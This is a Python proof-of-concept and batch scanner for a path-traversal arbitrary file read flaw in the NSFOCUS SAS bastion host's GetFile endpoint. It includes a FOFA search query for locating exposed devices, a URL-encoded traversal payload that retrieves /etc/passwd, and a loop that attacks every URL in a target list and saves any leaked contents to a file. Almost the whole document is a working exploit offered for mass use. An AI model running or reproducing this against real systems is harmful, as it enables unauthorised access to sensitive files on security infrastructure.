#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
# author : Lem  
import urllib.request  
import re  
import requests  
import io  
import sys  
requests.packages.urllib3.disable_warnings()  



def title():
    print("""
    Author: Lem
    Condition:fofa-query: body="'/needUsbkey.php?username='"
    Name:绿盟 SAS堡垒机 GetFile 任意文件读取漏洞
    Vulnerability details: 
    Solutions:
    POC:/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
    EXP: 
    """)

def basic_setting():
    timeout_s=3 
    regex_match=r'r(.+?)l' #自定义正则匹配规则
    proxies = {  
    'http': 'http://127.0.0.1:8080',  #proxies=proxies
    'https': 'http://127.0.0.1:8080',  
    }
    requests_methods = {'get': requests.get, 'post': requests.post, 'put': requests.put, 'delete': requests.delete}   
    return timeout_s,regex_match,proxies,requests_methods

def readfiles(): #批量读取文件，文本格式为https://127.0.0.1:8080
    result = [] 
    with open(r'urls.txt' ,'r') as f:
        for line in f:
         result.append(line.strip().split(',')[0])  
        return result

def all_poc():  #自定义poc内容
    #poc_url = "/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd"  
    poc_url = "/webconf/GetFile/index?path=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"  
    poc_post_data = ''  
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          #'Accept-Encoding': 'gzip, deflate',
          #'Accept-Language': 'zh-CN,zh;q=0.9',
          #'Cache-Control': 'max-age=0',
          #'Connection': 'keep-alive',
          #'Cookie': 'PHPSESSID=742ad32e602a6430062c3994b971c82e',
          #'Host': 'www.baidu.com',
          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'
          }
    files = ''     #{"file":("test.txt","hello")}  #Content-Disposition: form-data; name="file"; filename="test.txt"
    method= 'get'  #get post
    return poc_url, poc_post_data,header,files,method  


def scan_urls_method():
    poc_url, poc_post_data,header,files,method = all_poc()  
    result = readfiles()   
    timeout_s,regex_match,proxies,requests_methods = basic_setting()
    #timeout_s,regex_match,_ ,requests_methods= basic_setting()  #禁用proxies
    
    for url in result:  
        scan = f"{url}{poc_url}"   
        print(scan)  
        try:
            if method in requests_methods:
                re_data = requests_methods[method] (scan,data=poc_post_data,files=files,timeout=timeout_s,headers=header,verify=False,proxies='') 
            else:
                raise ValueError('Invalid method. Only "get", "post", "put" and "delete" are supported.') 
            print(re_data.status_code)  
            if re_data.status_code == 200:  
                #find_list = re.findall(regex_match, re_data.text)  
                if 'nsfocus' in re_data.text:
                    print('读取成功') 
                    with open('scan_out.txt', mode='a') as file_handle:  
                        #a = f"{scan}-{find_list}" 
                        file_handle.write(f"{scan}\n{re_data.text}\n") 
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e)) 
  
if __name__ == '__main__':
    title()   
    scan_urls_method()